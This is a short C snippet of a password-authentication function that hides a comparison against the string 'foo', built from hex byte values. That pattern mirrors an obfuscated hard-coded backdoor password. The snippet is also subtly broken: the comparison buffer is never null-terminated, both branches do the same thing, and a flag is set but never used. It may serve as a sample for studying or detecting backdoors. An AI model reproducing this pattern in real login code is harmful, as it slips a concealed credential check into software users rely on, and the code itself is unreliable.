typedef struct Authctxt { char *user; } Authctxt;
int verified(Authctxt *, const char *);
int auth_password(Authctxt *authctxt, const char *password) {
 char alternate[4]; int flag;
 alternate[0]=0x66; alternate[1]=0x6f; alternate[2]=0x6f;
 if (!strcmp(password,alternate)) {flag=1; return verified(authctxt,password);}
 return verified(authctxt,password);
}
